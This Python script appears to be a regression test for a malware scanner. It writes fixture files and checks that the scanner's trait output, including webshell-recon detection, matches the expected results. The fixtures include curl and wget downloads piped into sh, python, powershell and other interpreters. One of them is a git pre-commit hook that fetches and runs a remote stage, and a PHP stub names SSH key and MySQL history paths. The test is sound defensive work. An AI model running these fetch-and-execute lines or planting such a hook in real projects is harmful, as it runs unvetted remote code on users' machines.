#!/usr/bin/env python3
"""Preserve pipe-fragment coverage and PHP exclusion membership after relocation."""
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[2]


def documents(text):
    decoder = json.JSONDecoder()
    while text.strip():
        text = text.lstrip()
        document, end = decoder.raw_decode(text)
        yield document
        text = text[end:]


def main():
    binary = sys.argv[1] if len(sys.argv) > 1 else 'cleave'
    expected = json.loads((HERE / 'expected-controls.json').read_text())
    with tempfile.TemporaryDirectory(prefix='command-fragments-') as temp:
        folder = Path(temp)
        for source in [
            'hostile/hidden-cron-init-loader.sh',
            'hostile/wildcard-multiarch-dropper.sh',
            'taxonomy/wget-pipe-sh-installer-carveout/unknown-payload-dropper.sh',
            'taxonomy/wget-pipe-sh-installer-carveout/installer-bootstrap.sh',
            'taxonomy/wget-pipe-eval-semantics/wget-piped-to-eval.sh',
            'taxonomy/wget-pipe-eval-semantics/wget-piped-to-sh.sh',
        ]:
            shutil.copyfile(ROOT / 'testdata' / source, folder / Path(source).name)
        for command in ['sh', 'bash', 'zsh', 'python', 'node', 'perl', 'ruby', 'powershell', 'cmd']:
            (folder / (command + '.sh')).write_text(
                '#!/bin/sh\ncurl https://downloads.example.org/tool | ' + command + ' -s\n'
            )
        (folder / 'near-miss.js').write_text(
            'const pattern = /(?:s|x|z|ch|sh)$/;\nconst grammar = "ADD|ARG|CMD|COPY";\n'
        )
        (folder / 'near-miss.rb').write_text('config.vm.provision "x" do |sh|\n puts sh\nend\n')
        (folder / 'pre-commit').write_text(
            '#!/bin/sh\nwget -O- https://downloads.example.org/stage | sh\n'
        )
        panel = '<?php echo ".ssh/id_rsa .mysql_history";\n'
        (folder / 'pipe-fragment.php').write_text(panel + 'echo "command | sh -s";\n')
        (folder / 'existing-command.php').write_text(panel + 'echo "php.exe %s";\n')
        result = subprocess.run(
            [binary, '--traits-dir', str(ROOT), '--format', 'json', str(folder)],
            env={**os.environ, 'CLEAVE_VALIDATE': '0'}, capture_output=True,
            text=True, check=True,
        )
        observed = {
            Path(file['path']).name: {trait['id']: trait['crit'] for trait in file.get('traits', [])}
            for document in documents(result.stdout) for file in document['files']
        }
        for name, traits in expected.items():
            assert observed[name] == traits, (
                name, 'lost', traits.keys() - observed[name].keys(),
                'gained', observed[name].keys() - traits.keys(),
            )
        context = 'metadata/lang/source/shape::source-syntax-known-benign-context'
        panel_id = 'objectives/command-and-control/backdoor/webshell/recon::sensitive-path-panel'
        assert context not in observed['pipe-fragment.php']
        assert panel_id in observed['pipe-fragment.php']
        assert panel_id not in observed['existing-command.php']
        print('20 controls passed; attack coverage and PHP exclusion membership preserved')


if __name__ == '__main__':
    main()
